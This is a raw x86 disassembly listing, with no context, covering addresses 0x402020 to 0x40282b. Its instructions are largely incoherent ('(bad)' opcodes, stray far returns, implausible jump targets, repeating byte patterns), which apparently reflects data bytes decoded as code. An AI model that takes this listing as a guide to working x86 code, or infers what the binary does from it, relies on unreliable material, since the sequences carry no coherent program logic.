  402020:	adc    al,BYTE PTR [edx+0x38]
  402023:	jbe    0x40205e
  402025:	push   ebx
  402026:	or     ch,BYTE PTR [edx+0x40]
  402029:	inc    ecx
  40202a:	inc    ebx
  40202b:	inc    eax
  40202c:	add    eax,0x43406262
  402031:	inc    ecx
  402032:	adc    BYTE PTR [eax],al
  402034:	inc    eax
  402035:	add    eax,0x43000562
  40203a:	add    BYTE PTR [ecx+0x40],al
  40203d:	inc    eax
  40203e:	add    eax,0x400062
  402043:	inc    ebx
  402044:	inc    eax
  402045:	js     0x402088
  402047:	inc    ecx
  402048:	bound  eax,QWORD PTR [eax-0x55]
  40204b:	daa    
  40204c:	ins    DWORD PTR es:[edi],dx
  40204d:	addr16 or al,dl
  402050:	jmp    0x402092
  402052:	mov    eax,0x8a9a8e4
  402057:	and    eax,0xfa4d4053
  40205c:	adc    ah,cl
  40205e:	mov    ah,0x40
  402060:	addr16 inc eax
  402062:	push   ebx
  402063:	inc    esp
  402064:	mov    eax,0xbfc070cb
  402069:	sbb    al,0x30
  40206b:	dec    ebp
  40206c:	inc    ecx
  40206d:	sbb    al,0x53
  40206f:	and    esp,DWORD PTR [edi+0x41]
  402072:	pop    esi
  402073:	(bad)  
  402074:	or     BYTE PTR [ebx+edi*1],dh
  402077:	cmp    ecx,ebp
  402079:	inc    eax
  40207a:	cld    
  40207b:	dec    esp
  40207c:	enter  0x4062,0x5
  402080:	inc    ecx
  402081:	add    BYTE PTR [ebx+0x40],al
  402084:	inc    eax
  402085:	inc    ecx
  402086:	inc    eax
  402087:	inc    eax
  402088:	bound  eax,QWORD PTR ds:0x5624300
  40208e:	add    BYTE PTR [eax+0x40],al
  402091:	add    BYTE PTR [ecx+0x43],al
  402094:	add    BYTE PTR [eax+0x41],al
  402097:	add    eax,0x40436200
  40209c:	inc    eax
  40209d:	add    eax,0xc094bf62
  4020a2:	das    
  4020a3:	dec    esp
  4020a4:	push   0xffffff9f
  4020a6:	arpl   WORD PTR [ecx+0x46],ax
  4020a9:	adc    eax,0xe5533ca3
  4020ae:	retf   
  4020af:	mov    edi,DWORD PTR [ecx]
  4020b1:	xor    esp,DWORD PTR [edx+0x60]
  4020b4:	fcomp  QWORD PTR [edx+0x11]
  4020b7:	clc    
  4020b8:	and    BYTE PTR [ecx+0x40],al
  4020bb:	add    eax,0x41624340
  4020c0:	test   BYTE PTR [eax],al
  4020c2:	and    eax,0x404043
  4020c7:	add    BYTE PTR ds:0x626210,al
  4020cd:	add    eax,0x43404140
  4020d2:	inc    eax
  4020d3:	inc    ecx
  4020d4:	add    eax,0x10664062
  4020d9:	inc    ebx
  4020da:	bound  edx,QWORD PTR [ecx+0x21]
  4020dd:	or     DWORD PTR [bx+di+0x64a0],edx
  4020e2:	pop    es
  4020e3:	rcl    BYTE PTR [esp+ebp*1+0x44],0x38
  4020e8:	or     eax,0x60a8d548
  4020ed:	push   edi
  4020ee:	addr16 push ebx
  4020f0:	not    esp
  4020f2:	cmp    BYTE PTR [eax+0x2f],ah
  4020f5:	cld    
  4020f6:	popa   
  4020f7:	inc    ebx
  4020f8:	dec    edi
  4020f9:	shl    DWORD PTR [edi],1
  4020fb:	pop    ecx
  4020fc:	inc    ebp
  4020fd:	test   al,0xec
  4020ff:	sub    BYTE PTR [eax-0x69],bh
  402102:	sbb    eax,0x6453a340
  402107:	jp     0x40214d
  402109:	test   al,0xfe
  40210b:	xor    edx,DWORD PTR [ebx+0x39]
  40210e:	pushf  
  40210f:	test   al,0x8
  402111:	adc    dl,BYTE PTR [ebp+eax*1+0x4041cc]
  402118:	add    BYTE PTR [eax],al
  40211a:	inc    eax
  40211b:	inc    eax
  40211c:	inc    ebx
  40211d:	bound  eax,QWORD PTR [eax]
  40211f:	inc    eax
  402120:	inc    eax
  402121:	add    eax,0x62434162
  402126:	inc    eax
  402127:	js     0x402139
  402129:	inc    ecx
  40212a:	add    eax,0x5404325
  40212f:	bound  eax,QWORD PTR [eax+0x40]
  402132:	inc    ecx
  402133:	inc    ebx
  402134:	push   eax
  402135:	jmp    0xe052c9cc
  40213a:	ror    eax,0xc0
  40213d:	ret    
  40213e:	jae    0x40216b
  402140:	pop    eax
  402141:	fs push esp
  402143:	inc    esi
  402144:	add    DWORD PTR [edi-0x7e],esp
  402147:	sub    al,BYTE PTR [ecx+0x4c]
  40214a:	retf   
  40214b:	iret   
  40214c:	add    esi,DWORD PTR [edi-0x478c4b35]
  402152:	mov    ah,0xd3
  402154:	pop    edx
  402155:	js     0x4020da
  402157:	or     eax,0x400dcb0c
  40215c:	ret    0xaa27
  40215f:	leave  
  402160:	bound  ebp,QWORD PTR [eax+0x6e2c4045]
  402166:	xchg   ebx,eax
  402167:	pusha  
  402168:	mov    ebx,0x40400f10
  40216d:	jmp    0x43a26297
  402172:	add    BYTE PTR [eax],dl
  402174:	inc    eax
  402175:	add    BYTE PTR ds:0x62410040,al
  40217b:	inc    eax
  40217c:	add    BYTE PTR [ebx-0x34],al
  40217f:	inc    eax
  402180:	add    eax,0x78434040
  402185:	bound  eax,QWORD PTR [ecx+0x78]
  402188:	add    eax,0x62404043
  40218d:	nop
  40218e:	or     BYTE PTR [ebx-0x3fbfb7be],dl
  402194:	(bad)  
  402195:	in     eax,dx
  402196:	retf   
  402197:	xchg   ecx,eax
  402198:	inc    ecx
  402199:	(bad)  
  40219a:	(bad)  [edi+eiz*1]
  40219d:	inc    esi
  40219e:	inc    ebx
  40219f:	cmp    dl,BYTE PTR [ecx+0x60]
  4021a2:	cmc    
  4021a3:	push   esi
  4021a4:	dec    ebx
  4021a5:	inc    edx
  4021a6:	or     dl,BYTE PTR [edx+0x3c]
  4021a9:	sub    al,BYTE PTR [eax+0x14bc65c0]
  4021af:	xchg   ebp,eax
  4021b0:	push   edx
  4021b1:	cmp    edi,esp
  4021b3:	jge    0x4021c5
  4021b5:	imul   esp,DWORD PTR [edx-0x5c],0x40054041
  4021bc:	bound  eax,QWORD PTR [ebx+0x43]
  4021bf:	add    eax,0x62004040
  4021c4:	inc    eax
  4021c5:	add    BYTE PTR [ecx+0x40],al
  4021c8:	inc    ebx
  4021c9:	test   BYTE PTR ds:0x58054041,ah
  4021cf:	inc    eax
  4021d0:	inc    eax
  4021d1:	bound  eax,QWORD PTR [eax+0x66]
  4021d4:	inc    ecx
  4021d5:	inc    eax
  4021d6:	add    eax,0x47abf700
  4021db:	inc    eax
  4021dc:	gs inc ebx
  4021de:	xor    eax,0xcb404f5a
  4021e3:	rcr    BYTE PTR [edi+0x48],0x80
  4021e7:	int    0x25
  4021e9:	inc    edx
  4021ea:	ds adc eax,0xcbc5682f
  4021f0:	or     bl,BYTE PTR [ebp+0x49]
  4021f3:	add    BYTE PTR [eax],al
  4021f5:	inc    ebx
  4021f6:	inc    eax
  4021f7:	bound  eax,QWORD PTR ds:0x25404110
  4021fd:	add    ah,cl
  4021ff:	inc    ebx
  402200:	add    eax,0x40402562
  402205:	add    BYTE PTR [eax+0x40],al
  402208:	inc    ecx
  402209:	inc    ecx
  40220a:	add    eax,0x78434025
  40220f:	bound  eax,QWORD PTR [eax-0x7c]
  402212:	inc    eax
  402213:	inc    ecx
  402214:	xor    esp,DWORD PTR [edi]
  402216:	add    BYTE PTR [eax-0x70],0xcb
  40221a:	and    bl,ah
  40221c:	sbb    ah,BYTE PTR [ebp+0x1b]
  40221f:	mov    bh,0xbf
  402221:	cmp    DWORD PTR [edx],eax
  402223:	jge    0x4021e5
  402225:	adc    al,0x1e
  402227:	imul   eax,DWORD PTR [eax+0x28],0x212c4887
  40222e:	xchg   BYTE PTR [edx+0x42],bl
  402231:	push   edx
  402232:	dec    eax
  402233:	sub    bl,BYTE PTR [esi-0x41]
  402236:	retf   
  402237:	inc    eax
  402238:	inc    esp
  402239:	rcl    BYTE PTR ds:0x9214c0bf,1
  40223f:	mov    ch,0x28
  402241:	inc    esp
  402242:	retf   
  402243:	arpl   WORD PTR [eax+0x62],sp
  402246:	jae    0x4022af
  402248:	adc    eax,0x416b4239
  40224d:	inc    eax
  40224e:	inc    eax
  40224f:	inc    ebx
  402250:	int3   
  402251:	add    BYTE PTR ds:0x56240,al
  402257:	inc    ebx
  402258:	inc    eax
  402259:	inc    eax
  40225a:	add    BYTE PTR [ecx+0x62],al
  40225d:	bound  eax,QWORD PTR [eax]
  40225f:	int3   
  402260:	inc    eax
  402261:	inc    ebx
  402262:	add    eax,0x43624041
  402267:	adc    BYTE PTR [ecx+0x5],al
  40226a:	inc    eax
  40226b:	imul   esi,DWORD PTR [eax],0xe
  40226e:	sub    ah,ah
  402270:	and    al,0x96
  402272:	jno    0x402234
  402274:	jp     0x4022b7
  402276:	ja     0x4022f1
  402278:	adc    esp,esp
  40227a:	xor    ch,BYTE PTR [esi]
  40227c:	mov    ds:0xe562d136,eax
  402281:	arpl   WORD PTR [edi+edx*2-0x349db389],dx
  402288:	bound  esp,QWORD PTR [eax+0x62]
  40228b:	inc    ebx
  40228c:	inc    eax
  40228d:	adc    BYTE PTR ds:0x4158cc40,al
  402293:	inc    ebx
  402294:	bound  eax,QWORD PTR [ecx+0x40]
  402297:	add    eax,0x4140
  40229c:	and    eax,0x40400062
  4022a1:	add    eax,0x84404340
  4022a6:	int3   
  4022a7:	js     0x4022a9
  4022a9:	inc    ecx
  4022aa:	adc    BYTE PTR [edx+0xf],ah
  4022ad:	rol    al,0x21
  4022b0:	or     BYTE PTR fs:[edx-0x33],ah
  4022b4:	fdivr  st(3),st
  4022b6:	adc    eax,0xc118047e
  4022bb:	adc    BYTE PTR [esi+0x62],dl
  4022be:	mov    es:0x4262627b,eax
  4022c4:	xor    eax,0x475e420c
  4022c9:	popa   
  4022ca:	fwait
  4022cb:	retf   
  4022cc:	nop
  4022cd:	xchg   ebx,eax
  4022ce:	shl    BYTE PTR [ebp-0x575fffce],0x5
  4022d5:	call   0x408162da
  4022da:	inc    ebx
  4022db:	bound  ax,DWORD PTR ds:0x40434100
  4022e2:	add    eax,0x40054062
  4022e7:	bound  eax,QWORD PTR [ecx+0x40]
  4022ea:	inc    ebx
  4022eb:	inc    eax
  4022ec:	add    eax,0x25405841
  4022f1:	bound  eax,QWORD PTR [eax+0x43]
  4022f4:	inc    eax
  4022f5:	adc    BYTE PTR [esi+0x4d],bh
  4022f8:	dec    eax
  4022f9:	bound  esp,QWORD PTR [ebx+0x42]
  4022fc:	jnp    0x402320
  4022fe:	pop    ebp
  4022ff:	loopne 0x402338
  402301:	jnp    0x4022b7
  402303:	inc    esp
  402304:	inc    esp
  402305:	push   0x85502fc0
  40230a:	and    ah,BYTE PTR [eax]
  40230c:	inc    ebx
  40230d:	int3   
  40230e:	jl     0x40230e
  402310:	add    DWORD PTR fs:[ecx-0x58],0xc40fb6c
  402318:	adc    al,0x65
  40231a:	arpl   WORD PTR ds:0xa3c37f8c,cx
  402320:	jnp    0x4022eb
  402322:	aam    0xc9
  402324:	arpl   WORD PTR [edi+0x40434140],si
  40232a:	add    eax,0x43406262
  40232f:	inc    ecx
  402330:	adc    BYTE PTR [eax],al
  402332:	inc    eax
  402333:	add    eax,0x43000562
  402338:	add    BYTE PTR [ecx+0x40],al
  40233b:	inc    eax
  40233c:	add    eax,0x400062
  402341:	inc    ebx
  402342:	inc    eax
  402343:	js     0x402386
  402345:	inc    ecx
  402346:	bound  eax,QWORD PTR [eax+0x59]
  402349:	xlat   BYTE PTR ds:[ebx]
  40234a:	dec    esi
  40234b:	jmp    0x40233d
  40234d:	mov    ah,0x6
  40234f:	(bad)  
  402350:	shl    BYTE PTR ds:0x4141f932,0xa8
  402357:	adc    DWORD PTR [edx+0x68],ecx
  40235a:	xchg   ecx,eax
  40235b:	rcl    BYTE PTR [eax+0xd],0x10
  40235f:	out    0x62,al
  402361:	inc    eax
  402362:	add    eax,0x40430041
  402367:	inc    eax
  402368:	inc    ecx
  402369:	inc    eax
  40236a:	inc    eax
  40236b:	bound  eax,QWORD PTR ds:0x5624300
  402371:	add    BYTE PTR [eax+0x40],al
  402374:	add    BYTE PTR [ecx+0x43],al
  402377:	add    BYTE PTR [eax+0x41],al
  40237a:	add    eax,0x40436200
  40237f:	inc    eax
  402380:	add    eax,0x43241662
  402385:	test   al,0x49
  402387:	dec    eax
  402388:	retf   0x4062
  40238b:	add    al,0xa6
  40238d:	cmp    esp,DWORD PTR [esp+eiz*2]
  402390:	inc    esp
  402391:	push   ebx
  402392:	dec    ebp
  402393:	pop    esp
  402394:	mov    bh,0x36
  402396:	inc    ecx
  402397:	inc    eax
  402398:	add    eax,0x41624340
  40239d:	test   BYTE PTR [eax],al
  40239f:	and    eax,0x404043
  4023a4:	add    BYTE PTR ds:0x626210,al
  4023aa:	add    eax,0x43404140
  4023af:	inc    eax
  4023b0:	inc    ecx
  4023b1:	add    eax,0x10664062
  4023b6:	inc    ebx
  4023b7:	bound  edi,QWORD PTR [eax]
  4023b9:	(bad)
  4023bc:	inc    eax
  4023bd:	and    al,0x54
  4023bf:	adc    ah,dl
  4023c1:	dec    edi
  4023c2:	mov    ah,0xf9
  4023c4:	jle    0x4023fa
  4023c6:	fs xor eax,0x51580f1
  4023cc:	int3   
  4023cd:	inc    ecx
  4023ce:	inc    eax
  4023cf:	add    BYTE PTR [eax],al
  4023d1:	add    BYTE PTR [eax+0x40],al
  4023d4:	inc    ebx
  4023d5:	bound  eax,QWORD PTR [eax]
  4023d7:	inc    eax
  4023d8:	inc    eax
  4023d9:	add    eax,0x62434162
  4023de:	inc    eax
  4023df:	js     0x4023f1
  4023e1:	inc    ecx
  4023e2:	add    eax,0x5404325
  4023e7:	bound  eax,QWORD PTR [eax+0x40]
  4023ea:	inc    ecx
  4023eb:	inc    ebx
  4023ec:	pop    edx
  4023ed:	inc    eax
  4023ee:	imul   eax,DWORD PTR [eax+eax*4],0x1fcbc553
  4023f5:	bound  esp,QWORD PTR [ecx+0x41b840cb]
  4023fb:	mov    eax,0x88434038
  402400:	inc    eax
  402401:	or     eax,0x43624125
  402406:	add    BYTE PTR [eax],dl
  402408:	inc    eax
  402409:	add    BYTE PTR ds:0x62410040,al
  40240f:	inc    eax
  402410:	add    BYTE PTR [ebx-0x34],al
  402413:	inc    eax
  402414:	add    eax,0x78434040
  402419:	bound  eax,QWORD PTR [ecx+0x78]
  40241c:	add    eax,0x62404043
  402421:	inc    ecx
  402422:	inc    edi
  402423:	pop    ebp
  402424:	jnp    0x402449
  402426:	retf   
  402427:	arpl   bx,cx
  402429:	dec    eax
  40242a:	sbb    esi,DWORD PTR [eax+0x7d58ab40]
  402430:	enter  0xcc69,0x61
  402434:	inc    ebx
  402435:	dec    eax
  402436:	fs xchg edx,eax
  402438:	out    dx,eax
  402439:	retf   
  40243a:	jmp    0x402433
  40243c:	inc    esi
  40243d:	loopne 0x402463
  40243f:	mov    edi,0x98c3a820
  402444:	add    DWORD PTR [ecx],ecx
  402446:	mov    bh,0x46
  402448:	sub    BYTE PTR [edx],dl
  40244a:	dec    edi
  40244b:	and    BYTE PTR [eax+0x4f],al
  40244e:	inc    ecx
  40244f:	inc    eax
  402450:	add    eax,0x43436240
  402455:	add    eax,0x62004040
  40245a:	inc    eax
  40245b:	add    BYTE PTR [ecx+0x40],al
  40245e:	inc    ebx
  40245f:	test   BYTE PTR ds:0x58054041,ah
  402465:	inc    eax
  402466:	inc    eax
  402467:	bound  eax,QWORD PTR [eax+0x66]
  40246a:	inc    ecx
  40246b:	inc    eax
  40246c:	add    eax,0x1210b000
  402471:	dec    esp
  402472:	pushf  
  402473:	push   esi
  402474:	add    ah,BYTE PTR [edi+0x412640cb]
  40247a:	add    eax,0xb36fd349
  40247f:	bound  edi,QWORD PTR [edi+0x47]
  402482:	jnp    0x402439
  402484:	inc    ecx
  402485:	loop   0x40243e
  402487:	rcr    BYTE PTR [edx+0x14],1
  40248a:	mov    eax,0xb43651c3
  40248f:	dec    ecx
  402490:	aad    0x52
  402492:	add    eax,0x3542416e
  402497:	sub    ebx,ecx
  402499:	adc    ebx,ecx
  40249b:	hlt    
  40249c:	jg     0x4024ff
  40249e:	mov    DWORD PTR [eax],ebx
  4024a0:	add    BYTE PTR [eax],al
  4024a2:	inc    ebx
  4024a3:	inc    eax
  4024a4:	bound  eax,QWORD PTR ds:0x25404110
  4024aa:	add    ah,cl
  4024ac:	inc    ebx
  4024ad:	add    eax,0x40402562
  4024b2:	add    BYTE PTR [eax+0x40],al
  4024b5:	inc    ecx
  4024b6:	inc    ecx
  4024b7:	add    eax,0x78434025
  4024bc:	bound  eax,QWORD PTR [eax-0x7c]
  4024bf:	inc    eax
  4024c0:	inc    ecx
  4024c1:	jne    0x402477
  4024c3:	mov    eax,0x4b504201
  4024c8:	dec    ebp
  4024c9:	add    eax,0x2307476a
  4024ce:	popa   
  4024cf:	cwde   
  4024d0:	mov    eax,ds:0x2b34c2a7
  4024d5:	into   
  4024d6:	dec    esp
  4024d7:	xchg   ecx,eax
  4024d8:	inc    edx
  4024d9:	fisub  WORD PTR [eax+ecx*8-0x59]
  4024dd:	or     esp,DWORD PTR [edx]
  4024df:	stos   BYTE PTR es:[edi],al
  4024e0:	add    ch,BYTE PTR [edx+0x6d]
  4024e3:	inc    ecx
  4024e4:	inc    eax
  4024e5:	inc    eax
  4024e6:	inc    ebx
  4024e7:	int3   
  4024e8:	add    BYTE PTR ds:0x56240,al
  4024ee:	inc    ebx
  4024ef:	inc    eax
  4024f0:	inc    eax
  4024f1:	add    BYTE PTR [ecx+0x62],al
  4024f4:	bound  eax,QWORD PTR [eax]
  4024f6:	int3   
  4024f7:	inc    eax
  4024f8:	inc    ebx
  4024f9:	add    eax,0x43624041
  4024fe:	adc    BYTE PTR [ecx+0x5],al
  402501:	inc    eax
  402502:	mov    eax,0x91f754d6
  402507:	imul   ebp,DWORD PTR [eax+0x75488970],0x6b629b2d
  402511:	bound  esp,QWORD PTR [ebp+0x56]
  402514:	rol    DWORD PTR [ecx-0x6f],cl
  402517:	jo     0x4024bc
  402519:	bound  eax,QWORD PTR [ebx+0x40]
  40251c:	adc    BYTE PTR ds:0x4158cc40,al
  402522:	inc    ebx
  402523:	bound  eax,QWORD PTR [ecx+0x40]
  402526:	add    eax,0x4140
  40252b:	and    eax,0x40400062
  402530:	add    eax,0x84404340
  402535:	int3   
  402536:	js     0x402538
  402538:	inc    ecx
  402539:	adc    BYTE PTR [edx+0xf],ah
  40253c:	jmp    0x4025a0
  40253e:	pop    esp
  40253f:	dec    ecx
  402540:	pusha  
  402541:	test   eax,0xf9852d0
  402546:	dec    esi
  402547:	and    edx,DWORD PTR [bx+di+0x1088]
  40254c:	sbb    BYTE PTR fs:[edi+ecx*2+0x52986453],dl
  402554:	or     esp,DWORD PTR [ebx-0x5e]
  402557:	cmp    esp,DWORD PTR [edi+0x40]
  40255a:	aas    
  40255b:	push   edx
  40255c:	pop    eax
  40255d:	dec    ecx
  40255e:	add    al,BYTE PTR [ecx+0x13]
  402561:	inc    edx
  402562:	stos   DWORD PTR es:[edi],eax
  402563:	add    al,0x65
  402565:	fmul   DWORD PTR [ebx+0x49]
  402568:	loope  0x402596
  40256a:	mov    ah,0xcd
  40256c:	sub    BYTE PTR [ebx+0x13],al
  40256f:	add    BYTE PTR [eax+0x41],al
  402572:	inc    eax
  402573:	inc    ebx
  402574:	bound  ax,DWORD PTR ds:0x40434100
  40257b:	add    eax,0x40054062
  402580:	bound  eax,QWORD PTR [ecx+0x40]
  402583:	inc    ebx
  402584:	inc    eax
  402585:	add    eax,0x25405841
  40258a:	bound  eax,QWORD PTR [eax+0x43]
  40258d:	inc    eax
  40258e:	adc    BYTE PTR [eax+0x60],al
  402591:	push   eax
  402592:	push   ecx
  402593:	mov    esp,0x2fc567c4
  402598:	and    esp,DWORD PTR [edi+eiz*1+0x15]
  40259c:	mov    eax,ds:0x4e4b8acd
  4025a1:	adc    al,0x51
  4025a3:	retf   
  4025a4:	mov    dl,0x5e
  4025a6:	mov    ds:0x9ccb6140,eax
  4025ab:	or     eax,0xfda7343b
  4025b0:	dec    ebp
  4025b1:	push   esp
  4025b2:	jg     0x4025e9
  4025b4:	cs cmp eax,ebp
  4025b7:	jp     0x40255b
  4025b9:	fs inc esp
  4025bb:	inc    eax
  4025bc:	arpl   WORD PTR [esi],bx
  4025be:	inc    eax
  4025bf:	inc    ecx
  4025c0:	inc    ebx
  4025c1:	inc    eax
  4025c2:	add    eax,0x43406262
  4025c7:	inc    ecx
  4025c8:	adc    BYTE PTR [eax],al
  4025ca:	inc    eax
  4025cb:	add    eax,0x43000562
  4025d0:	add    BYTE PTR [ecx+0x40],al
  4025d3:	inc    eax
  4025d4:	add    eax,0x400062
  4025d9:	inc    ebx
  4025da:	inc    eax
  4025db:	js     0x40261e
  4025dd:	inc    ecx
  4025de:	bound  eax,QWORD PTR [eax-0x25]
  4025e1:	dec    ebp
  4025e2:	pop    ds
  4025e3:	sbb    al,0x65
  4025e5:	dec    eax
  4025e6:	xchg   edx,eax
  4025e7:	pop    esi
  4025e8:	inc    eax
  4025e9:	inc    eax
  4025ea:	es retf 
  4025ec:	dec    esp
  4025ed:	inc    eax
  4025ee:	xor    al,0x96
  4025f0:	pusha  
  4025f1:	sub    al,0x2a
  4025f3:	mov    BYTE PTR [ecx+0x34],dl
  4025f6:	lds    eax,FWORD PTR [ecx]
  4025f8:	inc    eax
  4025f9:	inc    eax
  4025fa:	jecxz  0x4025c7
  4025fc:	(bad)  
  4025fe:	dec    edi
  4025ff:	retf   
  402600:	inc    eax
  402601:	cmp    DWORD PTR [esi],esp
  402603:	add    DWORD PTR [ebx-0x3d],esp
  402606:	and    BYTE PTR [edx+0x40],0x5
  40260a:	inc    ecx
  40260b:	add    BYTE PTR [ebx+0x40],al
  40260e:	inc    eax
  40260f:	inc    ecx
  402610:	inc    eax
  402611:	inc    eax
  402612:	bound  eax,QWORD PTR ds:0x5624300
  402618:	add    BYTE PTR [eax+0x40],al
  40261b:	add    BYTE PTR [ecx+0x43],al
  40261e:	add    BYTE PTR [eax+0x41],al
  402621:	add    eax,0x40436200
  402626:	inc    eax
  402627:	add    eax,0x27404062
  40262c:	loope  0x4025d9
  40262e:	mov    bl,bh
  402630:	inc    eax
  402631:	mov    ds:0x931b4050,al
  402636:	daa    
  402637:	mov    esi,0x33408140
  40263c:	addr16 retf 
  40263e:	cmp    BYTE PTR [edx+0x63],bl
  402641:	inc    edx
  402642:	inc    eax
  402643:	inc    eax
  402644:	dec    ebx
  402645:	mov    cl,0x91
  402647:	lds    edi,FWORD PTR [ebp-0x79]
  40264a:	inc    eax
  40264b:	add    al,0x21
  40264d:	mov    bh,0x3a
  40264f:	leave  
  402650:	inc    esp
  402651:	call   0x4ca993a6
  402656:	and    eax,0x41635491
  40265b:	inc    eax
  40265c:	add    eax,0x41624340
  402661:	test   BYTE PTR [eax],al
  402663:	and    eax,0x404043
  402668:	add    BYTE PTR ds:0x626210,al
  40266e:	add    eax,0x43404140
  402673:	inc    eax
  402674:	inc    ecx
  402675:	add    eax,0x10664062
  40267a:	inc    ebx
  40267b:	bound  eax,QWORD PTR [eax+0x45]
  40267e:	jecxz  0x4026e4
  402680:	dec    eax
  402681:	mov    edi,0x4040607c
  402686:	adc    eax,0x6841c804
  40268b:	aam    0x40
  40268d:	and    eax,0x6943cb61
  402692:	xlat   BYTE PTR ds:[ebx]
  402693:	retf   
  402694:	adc    BYTE PTR [ebx+0x69],bl
  402697:	cwde   
  402698:	ss sub al,0x8e
  40269b:	sub    al,0x40
  40269d:	inc    eax
  40269e:	and    al,BYTE PTR ds:0x4041cc
  4026a4:	add    BYTE PTR [eax],al
  4026a6:	inc    eax
  4026a7:	inc    eax
  4026a8:	inc    ebx
  4026a9:	bound  eax,QWORD PTR [eax]
  4026ab:	inc    eax
  4026ac:	inc    eax
  4026ad:	add    eax,0x62434162
  4026b2:	inc    eax
  4026b3:	js     0x4026c5
  4026b5:	inc    ecx
  4026b6:	add    eax,0x5404325
  4026bb:	bound  eax,QWORD PTR [eax+0x40]
  4026be:	inc    ecx
  4026bf:	inc    ebx
  4026c0:	retf   
  4026c1:	jecxz  0x40268b
  4026c3:	test   al,0x5c
  4026c5:	inc    eax
  4026c6:	xor    bh,BYTE PTR [edi]
  4026c8:	mov    cl,0x59
  4026ca:	inc    ebx
  4026cb:	ins    DWORD PTR es:[edi],dx
  4026cc:	sub    BYTE PTR [eax+0x79],al
  4026cf:	aaa    
  4026d0:	mov    bh,0x8d
  4026d2:	cmp    eax,0x40101297
  4026d7:	pusha  
  4026d8:	xchg   edx,eax
  4026d9:	das    
  4026da:	and    BYTE PTR [edx-0x4c],0x40
  4026de:	and    ah,cl
  4026e0:	jae    0x4026f6
  4026e2:	test   al,0x41
  4026e4:	adc    eax,0x50553f40
  4026e9:	gs and eax,0x436241
  4026ef:	adc    BYTE PTR [eax+0x0],al
  4026f2:	add    eax,0x62410040
  4026f7:	inc    eax
  4026f8:	add    BYTE PTR [ebx-0x34],al
  4026fb:	inc    eax
  4026fc:	add    eax,0x78434040
  402701:	bound  eax,QWORD PTR [ecx+0x78]
  402704:	add    eax,0x62404043
  402709:	adc    BYTE PTR [edi],dl
  40270b:	int    0x41
  40270d:	dec    esp
  40270e:	jecxz  0x402774
  402710:	pop    edx
  402711:	mov    ecx,cs
  402713:	adc    eax,edx
  402715:	adc    eax,0x535044e
  40271a:	mov    ebp,0xad27409c
  40271f:	retf   
  402720:	bswap  ebx
  402722:	and    BYTE PTR ds:0x54058640,cl
  402728:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402729:	inc    ebx
  40272a:	and    al,0xcd
  40272c:	inc    eax
  40272d:	inc    ecx
  40272e:	in     eax,dx
  40272f:	bound  ecx,QWORD PTR fs:[ebp-0x7c]
  402733:	inc    eax
  402734:	inc    eax
  402735:	inc    edx
  402736:	push   esp
  402737:	or     al,0x26
  402739:	mov    eax,es
  40273b:	dec    eax
  40273c:	inc    eax
  40273d:	inc    eax
  40273e:	and    ecx,ebx
  402740:	inc    ecx
  402741:	inc    eax
  402742:	add    eax,0x43436240
  402747:	add    eax,0x62004040
  40274c:	inc    eax
  40274d:	add    BYTE PTR [ecx+0x40],al
  402750:	inc    ebx
  402751:	test   BYTE PTR ds:0x58054041,ah
  402757:	inc    eax
  402758:	inc    eax
  402759:	bound  eax,QWORD PTR [eax+0x66]
  40275c:	inc    ecx
  40275d:	inc    eax
  40275e:	add    eax,0x1011c000
  402763:	(bad)  
  402764:	shl    DWORD PTR [edi+edi*1],1
  402767:	pop    eax
  402768:	bound  eax,QWORD PTR [edx+0x52]
  40276b:	call   0x35ed35b0
  402770:	inc    esi
  402771:	xor    esp,eax
  402773:	bound  eax,QWORD PTR [eax+0x40]
  402776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402777:	add    BYTE PTR [eax],al
  402779:	inc    ebx
  40277a:	inc    eax
  40277b:	bound  eax,QWORD PTR ds:0x25404110
  402781:	add    ah,cl
  402783:	inc    ebx
  402784:	add    eax,0x40402562
  402789:	add    BYTE PTR [eax+0x40],al
  40278c:	inc    ecx
  40278d:	inc    ecx
  40278e:	add    eax,0x78434025
  402793:	bound  eax,QWORD PTR [eax-0x7c]
  402796:	inc    eax
  402797:	inc    ecx
  402798:	add    al,0xcd
  40279b:	dec    edi
  40279c:	push   eax
  40279d:	inc    eax
  40279e:	xor    BYTE PTR [ebx+ecx*2],al
  4027a1:	or     ebp,0xe3fdc43
  4027a7:	aas    
  4027a8:	pop    eax
  4027a9:	test   al,0x58
  4027ab:	ds addr16 inc eax
  4027ae:	inc    ecx
  4027af:	aaa    
  4027b0:	adc    DWORD PTR fs:[edx],ebp
  4027b3:	fbstp  TBYTE PTR [eax+0x40]
  4027b6:	inc    esi
  4027b7:	loope  0x4027bd
  4027b9:	push   ebx
  4027ba:	inc    ecx
  4027bb:	aam    0xfb
  4027bd:	inc    eax
  4027be:	inc    esi
  4027bf:	xchg   ebx,eax
  4027c0:	retf   
  4027c1:	cmp    ebp,DWORD PTR [edx]
  4027c3:	idiv   DWORD PTR gs:[ebx+ebp*1]
  4027c7:	enter  0x4d16,0x90
  4027cb:	dec    esp
  4027cc:	or     DWORD PTR [ecx+0x40],eax
  4027cf:	inc    eax
  4027d0:	inc    ebx
  4027d1:	int3   
  4027d2:	add    BYTE PTR ds:0x56240,al
  4027d8:	inc    ebx
  4027d9:	inc    eax
  4027da:	inc    eax
  4027db:	add    BYTE PTR [ecx+0x62],al
  4027de:	bound  eax,QWORD PTR [eax]
  4027e0:	int3   
  4027e1:	inc    eax
  4027e2:	inc    ebx
  4027e3:	add    eax,0x43624041
  4027e8:	adc    BYTE PTR [ecx+0x5],al
  4027eb:	inc    eax
  4027ec:	inc    eax
  4027ed:	je     0x4027f3
  4027ef:	adc    ecx,ebx
  4027f1:	mov    edi,0x40408c05
  4027f6:	add    DWORD PTR [edx+0x10],ebx
  4027f9:	ins    BYTE PTR es:[edi],dx
  4027fa:	leave  
  4027fb:	add    eax,0x407f0640
  402800:	lods   al,BYTE PTR ds:[esi]
  402801:	add    BYTE PTR [edi+eax*4+0x2e],cl
  402805:	inc    eax
  402806:	add    eax,DWORD PTR [eax+0x41]
  402809:	inc    edi
  40280a:	inc    ecx
  40280b:	and    eax,DWORD PTR [eax+0x63]
  40280e:	pop    ecx
  40280f:	push   eax
  402810:	fs inc edx
  402812:	sub    BYTE PTR es:[eax+0x6],al
  402816:	add    ebp,DWORD PTR [eax+0x24]
  402819:	xor    ah,cl
  40281b:	dec    esi
  40281c:	inc    eax
  40281d:	inc    eax
  40281e:	pop    edi
  40281f:	dec    eax
  402820:	inc    esp
  402821:	mov    ds:0x10404362,al
  402826:	add    eax,0x4158cc40
  40282b:	inc    ebx
